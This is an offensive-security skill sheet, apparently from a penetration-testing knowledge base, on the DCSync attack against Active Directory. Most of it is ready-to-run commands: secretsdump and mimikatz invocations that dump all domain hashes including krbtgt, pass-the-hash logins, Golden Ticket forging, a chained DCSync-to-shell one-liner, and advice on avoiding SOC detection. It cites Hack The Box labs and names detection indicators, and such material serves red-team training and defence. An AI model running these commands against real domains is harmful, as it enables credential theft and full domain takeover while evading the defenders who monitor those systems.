# DCSync

> Replicate hashes from a Domain Controller using the standard
> Microsoft DRSUAPI replication interface, abused by anyone with
> `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.

## Objective
Pull NTLM hashes (and Kerberos keys) for every account in the domain —
including `krbtgt` — without having to log onto a DC.

## When To Use
- You have a credential that BloodHound (or manual ACL inspection)
  shows has DCSync rights.
- You are already a Domain Admin and want a clean hash dump.
- You want to extract `krbtgt` for a Golden Ticket.

## Detection Indicators
- BloodHound: principal has `DCSync` outbound edge to the domain.
- LDAP: `nTSecurityDescriptor` on the domain root grants
  `Replicating Directory Changes (All)` to a non-default principal.

## Enumeration Strategy

Confirm rights:
```bash
# bloodhound-python sees this; alternatively
impacket-dacledit -action read -principal '<user>' -target-dn 'DC=...,DC=...' \
  '<domain>/<user>:<pass>'

# manual via PowerView (Windows side)
Get-DomainObjectAcl -Identity 'DC=...,DC=...' \
  | ?{$_.ObjectAceType -match 'Replicating-Directory-Changes'}
```

## Exploitation Workflow

### Linux side

```bash
# Single user
impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<pass>@<dc-ip>

# Single user, with NTLM
impacket-secretsdump -just-dc-user krbtgt -hashes :<NTLM> <domain>/<user>@<dc-ip>

# Whole domain
impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>

# With Kerberos auth (-k -no-pass uses ccache)
impacket-secretsdump -k -no-pass <user>@<dc-host>
```

### Windows side

```powershell
# mimikatz
mimikatz # lsadump::dcsync /user:krbtgt /domain:<dom>
mimikatz # lsadump::dcsync /user:Administrator /domain:<dom>
mimikatz # lsadump::dcsync /all /domain:<dom>
```

## Commands

```bash
# Capture full database for offline use
impacket-secretsdump <domain>/<user>:<pass>@<dc-ip> > secrets.txt

# Filter for hashes only
grep ':::' secrets.txt | head

# Use the NTLM you got
evil-winrm -i <dc-ip> -u Administrator -H <NTLM>
impacket-psexec -hashes :<NTLM> Administrator@<ip>
```

## Tool Usage

- `impacket-secretsdump` — canonical DCSync from Linux. Also dumps SAM,
  LSA, NTDS from local copies.
- `mimikatz lsadump::dcsync` — canonical DCSync from Windows.
- `dirkjanm/krbrelayx` — DCSync via NTLM relaying from a printer
  (modern technique).

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Wrong DC IP | Connection refused | Verify which DC accepts replication |
| Wrong realm | "STATUS_LOGON_FAILURE" | Use `<DOMAIN>/<user>` |
| Missing rights but tried anyway | "DRSUAPI_REPLY_INVALID" | Confirm rights via BloodHound |
| Confusing DCSync with NTDS dump | Different prerequisites | DCSync = ACL-based; NTDS dump = filesystem-based (needs DA) |
| Forgetting `-just-dc` for clean output | Includes SAM/LSA local stuff too | Use `-just-dc` for domain-only dump |

## Decision-Making Logic

```
have an ACL granting GetChangesAll? → secretsdump -just-dc
have DA / local admin on a DC?     → reg save HKLM\SAM/SYSTEM/SECURITY → secretsdump LOCAL
have access via SMB to NTDS files? → secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

## Pivot Opportunities

After DCSync:
- **Pass-the-Hash as Administrator** to any host (`evil-winrm -H`,
  `psexec -hashes`).
- **Golden Ticket** with the krbtgt hash:
  ```bash
  impacket-ticketer -nthash <krbtgt-NTLM> -domain-sid <SID> -domain <dom> Administrator
  KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass Administrator@<host>
  ```
- **Silver Ticket** for a specific service (less detectable than
  Golden, doesn't require krbtgt).

## OPSEC Considerations

- DCSync on the DC logs Event ID 4662 with the GUID for the replication
  ACL. Mature SOCs alert on this.
- Use a dedicated DC (not the PDCe) for the replication request to
  reduce PDCe-correlated alerts (this is a real-engagement nuance).
- DCSync over LDAPS is identical from the DC's logging perspective.

## Real HTB Examples

- **Forest** — DCSync after adding ACL via Exchange WriteDACL.
- **Sauna** — DCSync directly as `svc_loanmgr`.
- **Cascade** — DCSync after compromising administrator via password
  reuse.
- **Active** — DCSync as Administrator after Kerberoast.
- **Resolute, Multimaster, Cascade, Sizzle, Sniper, Outdated** — DCSync
  is the universal final step on AD chains.

## Alternative Techniques

- **NTDS.dit dump** — file-based extraction; requires DA / local admin
  on a DC. `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`.
- **VSS shadow copy** — Volume Shadow Copy of NTDS for offline parsing
  when AV blocks live access.
- **LSA dump** — `secretsdump LOCAL` against SAM/SYSTEM/SECURITY for
  local accounts.

## Automation Opportunities

```bash
# DCSync-then-PtH one-liner
DOMAIN=htb.local USER=svc-alfresco PASS=s3rvice DC=10.10.10.161
HASH=$(impacket-secretsdump -just-dc-user Administrator $DOMAIN/$USER:$PASS@$DC \
  | awk -F: '/Administrator:500:/{print $4}')
echo "Administrator NTLM = $HASH"
evil-winrm -i $DC -u Administrator -H $HASH
```

## Checklist

- [ ] Confirm DCSync ACL via BloodHound or `dacledit`
- [ ] Run secretsdump with creds (`-just-dc`)
- [ ] Capture both krbtgt and Administrator hashes
- [ ] PtH evil-winrm to verify foothold
- [ ] Save hashes for Golden Ticket if needed

## Related Skills

- [`active-directory/writedacl-abuse.md`](writedacl-abuse.md)
- [`active-directory/bloodhound-usage.md`](bloodhound-usage.md)
- [`active-directory/golden-silver-tickets.md`](golden-silver-tickets.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
